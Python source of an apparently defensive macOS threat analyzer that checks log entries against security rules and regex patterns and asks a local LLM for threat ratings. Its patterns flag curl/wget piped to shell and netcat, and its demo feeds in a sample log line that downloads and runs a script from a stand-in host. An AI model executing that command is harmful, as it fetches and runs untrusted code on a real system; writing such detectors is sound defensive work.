#!/usr/bin/env python3
"""
Enhanced Threat Analyzer for NIMDA-Mac
Інтегрований аналізатор загроз з підтримкою правил безпеки та ШІ
"""

import logging
import re
import json
from datetime import datetime
from typing import Dict, List, Optional, Any
import sys
import os

# Додаємо шлях до корневої директорії для імпортів
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.rule_manager import RuleManager
from llm_security_agent import LLMSecurityAgent

# Налаштування логування
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

class ThreatAnalyzer:
    """
    Покращений аналізатор загроз з інтеграцією правил безпеки та ШІ
    """
    
    def __init__(self, db_manager=None):
        self.logger = logging.getLogger(__name__)
        self.db_manager = db_manager
        self.llm_agent = LLMSecurityAgent()
        self.rule_manager = RuleManager()
        
        # Завантажуємо правила при ініціалізації
        self.rules = self.rule_manager.get_parsed_rules()
        
        # Якщо правила не завантажились, спробуємо їх завантажити з мережі
        if not self.rules:
            self.logger.info("Правила не знайдено, спроба завантажити...")
            success_count = self.rule_manager.update_all_rules()
            if success_count > 0:
                self.rules = self.rule_manager.get_parsed_rules()
                self.logger.info(f"Завантажено {len(self.rules)} правил для аналізу.")
            else:
                self.logger.warning("Не вдалося завантажити правила з мережі. Працюємо без правил.")
        else:
            self.logger.info(f"Завантажено {len(self.rules)} правил для аналізу.")
    
    def analyze_log_entry(self, log_entry: str) -> Dict[str, Any]:
        """
        Аналізує запис логу на основі правил та за допомогою ШІ.
        
        Args:
            log_entry: Рядок логу для аналізу
            
        Returns:
            Словник з результатами аналізу
        """
        analysis_result = {
            'timestamp': datetime.now().isoformat(),
            'log_entry': log_entry,
            'threat_level': 'info',
            'rule_violations': [],
            'ai_analysis': None,
            'suggested_actions': []
        }
        
        # Крок 1: Перевірка на відповідність правилам безпеки
        rule_violations = self._check_security_rules(log_entry)
        analysis_result['rule_violations'] = rule_violations
        
        if rule_violations:
            analysis_result['threat_level'] = 'high'
            self.logger.warning(f"Знайдено {len(rule_violations)} порушень правил у записі: {log_entry[:100]}...")
        
        # Крок 2: Аналіз за допомогою ШІ
        try:
            ai_analysis = self._perform_ai_analysis(log_entry, rule_violations)
            analysis_result['ai_analysis'] = ai_analysis
            
            # Оновлюємо рівень загрози на основі ШІ аналізу
            if ai_analysis and 'threat_level' in ai_analysis:
                ai_threat_level = ai_analysis['threat_level'].lower()
                if ai_threat_level in ['high', 'critical']:
                    analysis_result['threat_level'] = ai_threat_level
                elif ai_threat_level == 'medium' and analysis_result['threat_level'] == 'info':
                    analysis_result['threat_level'] = 'medium'
                    
        except Exception as e:
            self.logger.error(f"Помилка ШІ аналізу: {e}")
            analysis_result['ai_analysis'] = {'error': str(e)}
        
        # Крок 3: Генерація рекомендованих дій
        analysis_result['suggested_actions'] = self._generate_suggested_actions(analysis_result)
        
        return analysis_result
    
    def _check_security_rules(self, log_entry: str) -> List[Dict[str, Any]]:
        """
        Перевіряє запис логу на відповідність правилам безпеки.
        
        Args:
            log_entry: Рядок логу для перевірки
            
        Returns:
            Список порушень правил
        """
        violations = []
        
        for rule in self.rules:
            try:
                # Перевіряємо content pattern
                if rule['content'] and rule['content'] in log_entry:
                    violation = {
                        'sid': rule['sid'],
                        'message': rule['message'],
                        'content_pattern': rule['content'],
                        'severity': 'high'
                    }
                    violations.append(violation)
                    self.logger.warning(f"Правило {rule['sid']} спрацювало: {rule['message']}")
                    
                # Додаткові перевірки за специфічними патернами для macOS
                elif self._check_macos_specific_patterns(log_entry, rule):
                    violation = {
                        'sid': rule['sid'],
                        'message': rule['message'],
                        'pattern_type': 'macos_specific',
                        'severity': 'medium'
                    }
                    violations.append(violation)
                    
            except Exception as e:
                self.logger.debug(f"Помилка при перевірці правила {rule.get('sid', 'unknown')}: {e}")
                continue
        
        return violations
    
    def _check_macos_specific_patterns(self, log_entry: str, rule: Dict) -> bool:
        """
        Перевіряє специфічні для macOS патерни безпеки.
        """
        macos_suspicious_patterns = [
            r'/bin/(bash|sh|zsh)',
            r'sudo\s+',
            r'/System/Library',
            r'launchctl\s+',
            r'curl\s+.*\|\s*(bash|sh)',
            r'wget\s+.*\|\s*(bash|sh)',
            r'/tmp/.*\.(sh|py|pl)',
            r'chmod\s+\+x',
            r'/usr/bin/ruby\s+-e',
            r'osascript\s+'
        ]
        
        for pattern in macos_suspicious_patterns:
            if re.search(pattern, log_entry, re.IGNORECASE):
                return True
        
        return False
    
    def _perform_ai_analysis(self, log_entry: str, rule_violations: List[Dict]) -> Optional[Dict[str, Any]]:
        """
        Виконує аналіз за допомогою ШІ.
        """
        if not self.llm_agent.check_ollama_connection():
            self.logger.warning("Ollama недоступна, пропускаємо ШІ аналіз")
            return None
        
        # Формуємо контекст для ШІ
        context = "You are a macOS security expert analyzing system logs for potential threats."
        
        if rule_violations:
            violations_text = "\n".join([
                f"- Rule {v['sid']}: {v['message']}" for v in rule_violations
            ])
            prompt = f"""
Analyze this macOS log entry that triggered security rules:

Log entry: "{log_entry}"

Triggered security rules:
{violations_text}

Please provide a JSON response with:
1. threat_level: (info/medium/high/critical)
2. analysis: Brief description of the threat
3. confidence: Confidence level (0-100)
4. recommended_actions: List of recommended actions

Format your response as valid JSON.
"""
        else:
            prompt = f"""
Analyze this macOS log entry for potential security threats:

Log entry: "{log_entry}"

Please provide a JSON response with:
1. threat_level: (info/medium/high/critical)
2. analysis: Brief description 
3. confidence: Confidence level (0-100)
4. recommended_actions: List of recommended actions

Format your response as valid JSON.
"""
        
        try:
            response = self.llm_agent.query_ollama(prompt, context)
            # Спробуємо розпарсити JSON відповідь
            ai_analysis = json.loads(response)
            return ai_analysis
        except json.JSONDecodeError:
            # Якщо відповідь не JSON, повертаємо як текст
            return {
                'threat_level': 'info',
                'analysis': response,
                'confidence': 50,
                'recommended_actions': []
            }
        except Exception as e:
            self.logger.error(f"Помилка ШІ аналізу: {e}")
            return None
    
    def _generate_suggested_actions(self, analysis_result: Dict[str, Any]) -> List[str]:
        """
        Генерує список рекомендованих дій на основі аналізу.
        """
        actions = []
        threat_level = analysis_result['threat_level']
        
        # Базові дії залежно від рівня загрози
        if threat_level in ['high', 'critical']:
            actions.extend([
                "Негайно перевірити активні процеси",
                "Проаналізувати мережеві з'єднання",
                "Перевірити цілісність системних файлів"
            ])
        elif threat_level == 'medium':
            actions.extend([
                "Моніторити подальшу активність",
                "Перевірити логи на схожі події"
            ])
        
        # Додаємо дії з ШІ аналізу, якщо вони є
        if analysis_result.get('ai_analysis') and 'recommended_actions' in analysis_result['ai_analysis']:
            ai_actions = analysis_result['ai_analysis']['recommended_actions']
            if isinstance(ai_actions, list):
                actions.extend(ai_actions)
        
        # Додаємо дії на основі порушених правил
        for violation in analysis_result.get('rule_violations', []):
            if 'bash' in violation.get('content_pattern', '').lower():
                actions.append("Перевірити історію команд shell")
            elif 'network' in violation.get('message', '').lower():
                actions.append("Аналізувати мережевий трафік")
        
        return list(set(actions))  # Видаляємо дублікати
    
    def analyze_process_activity(self, process_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Аналізує активність процесу на предмет загроз.
        
        Args:
            process_info: Інформація про процес (PID, name, path, etc.)
            
        Returns:
            Результат аналізу процесу
        """
        analysis_result = {
            'timestamp': datetime.now().isoformat(),
            'process_info': process_info,
            'threat_level': 'info',
            'suspicious_indicators': [],
            'ai_analysis': None,
            'suggested_commands': []
        }
        
        # Перевіряємо підозрілі індикатори
        suspicious_indicators = self._check_suspicious_process_indicators(process_info)
        analysis_result['suspicious_indicators'] = suspicious_indicators
        
        if suspicious_indicators:
            analysis_result['threat_level'] = 'medium'
        
        # ШІ аналіз процесу
        try:
            ai_analysis = self._perform_process_ai_analysis(process_info, suspicious_indicators)
            analysis_result['ai_analysis'] = ai_analysis
            
            if ai_analysis and ai_analysis.get('threat_level') == 'high':
                analysis_result['threat_level'] = 'high'
                
        except Exception as e:
            self.logger.error(f"Помилка ШІ аналізу процесу: {e}")
        
        # Генеруємо рекомендовані команди
        analysis_result['suggested_commands'] = self._generate_process_commands(analysis_result)
        
        return analysis_result
    
    def _check_suspicious_process_indicators(self, process_info: Dict[str, Any]) -> List[str]:
        """Перевіряє підозрілі індикатори в процесі."""
        indicators = []
        
        process_name = process_info.get('name', '').lower()
        process_path = process_info.get('path', '').lower()
        
        # Підозрілі шляхи
        suspicious_paths = ['/tmp/', '/var/tmp/', '/dev/shm/', '/private/tmp/']
        for path in suspicious_paths:
            if path in process_path:
                indicators.append(f"Процес запущено з підозрілого шляху: {path}")
        
        # Підозрілі імена процесів
        suspicious_names = ['nc', 'netcat', 'nmap', 'tcpdump', 'wireshark']
        if process_name in suspicious_names:
            indicators.append(f"Потенційно небезпечний процес: {process_name}")
        
        # Процеси з високими привілеями
        if process_info.get('user') == 'root' and 'system' not in process_path:
            indicators.append("Процес запущено з правами root")
        
        return indicators
    
    def _perform_process_ai_analysis(self, process_info: Dict, suspicious_indicators: List[str]) -> Optional[Dict]:
        """Виконує ШІ аналіз процесу."""
        if not self.llm_agent.check_ollama_connection():
            return None
        
        context = "You are a macOS security expert analyzing potentially suspicious processes."
        
        prompt = f"""
Analyze this macOS process for security threats:

Process Information:
- PID: {process_info.get('pid', 'N/A')}
- Name: {process_info.get('name', 'N/A')}
- Path: {process_info.get('path', 'N/A')}
- User: {process_info.get('user', 'N/A')}

Suspicious Indicators:
{chr(10).join(suspicious_indicators) if suspicious_indicators else 'None detected'}

Provide a JSON response with:
1. threat_level: (info/medium/high/critical)
2. analysis: Brief threat assessment
3. confidence: Confidence level (0-100)
4. recommended_commands: List of safe investigation commands for macOS

Format as valid JSON.
"""
        
        try:
            response = self.llm_agent.query_ollama(prompt, context)
            return json.loads(response)
        except (json.JSONDecodeError, Exception):
            return None
    
    def _generate_process_commands(self, analysis_result: Dict[str, Any]) -> List[str]:
        """Генерує безпечні команди для дослідження процесу."""
        commands = []
        process_info = analysis_result['process_info']
        pid = process_info.get('pid')
        
        if pid:
            # Базові команди дослідження
            commands.extend([
                f"lsof -p {pid}",  # Відкриті файли
                f"ps -p {pid} -o pid,ppid,user,comm,args",  # Детальна інформація
                f"sudo fs_usage -p {pid}",  # Файлова активність
            ])
            
            threat_level = analysis_result['threat_level']
            if threat_level in ['high', 'critical']:
                commands.extend([
                    f"kill -9 {pid}",  # Примусове завершення
                    f"sudo dtrace -n 'proc:::exit /pid == {pid}/ {{ trace(\"Process terminated\"); }}'",
                ])
        
        # Додаємо команди з ШІ, якщо вони є
        ai_analysis = analysis_result.get('ai_analysis')
        if ai_analysis and 'recommended_commands' in ai_analysis:
            commands.extend(ai_analysis['recommended_commands'])
        
        return commands[:5]  # Обмежуємо кількість команд

# Приклад використання
if __name__ == '__main__':
    analyzer = ThreatAnalyzer()
    
    # Тестуємо аналіз логу
    test_log = "bash -c 'curl http://suspicious-site.com/malware.sh | bash'"
    result = analyzer.analyze_log_entry(test_log)
    
    print("Результат аналізу логу:")
    print(json.dumps(result, indent=2, ensure_ascii=False))
    
    # Тестуємо аналіз процесу
    test_process = {
        'pid': 1234,
        'name': 'bash',
        'path': '/tmp/suspicious_script.sh',
        'user': 'root'
    }
    
    process_result = analyzer.analyze_process_activity(test_process)
    print("\nРезультат аналізу процесу:")
    print(json.dumps(process_result, indent=2, ensure_ascii=False))
